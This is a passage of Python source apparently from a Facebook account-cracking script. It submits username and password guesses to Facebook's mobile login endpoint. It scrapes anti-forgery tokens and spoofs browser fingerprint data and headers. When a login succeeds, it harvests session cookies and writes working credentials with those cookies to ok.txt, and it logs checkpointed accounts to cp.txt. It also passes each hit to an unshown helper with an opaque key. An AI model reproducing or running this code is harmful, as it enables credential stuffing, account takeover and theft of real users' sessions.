                    "try_number": "0",
                    "unrecognized_tries": "0",
                    "email": username,
                    "prefill_contact_point": f"{username} {password}",
                    "prefill_source": "browser_dropdown",
                    "prefill_type": "password",
                    "first_prefill_source": "browser_dropdown",
                    "first_prefill_type": "contact_point",
                    "had_cp_prefilled": True,
                    "had_password_prefilled": True,
                    "is_smart_lock": False,
                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}",
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                }
                head = {"Host": "m.facebook.com", "content-length": f"{str(len(data))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1), "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://m.facebook.com", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                xnxx = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print(f"\r[ {H}OK{N} ] {username}|{password}")
                    kntl = (f"[✓] {username}|{password}|{coki}")
                    self.ok.append(kntl)
                    self.memek(kntl, "lqkwndpnkefnfjsnwnfuoeohni3e")
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f"\r[ {K}CP{N} ] {username}|{password}")
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    self.memek(kntl, "lqkwndpnkefneihfwnfuoeohni3e")
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(kntl+"\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]! spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1





Login()
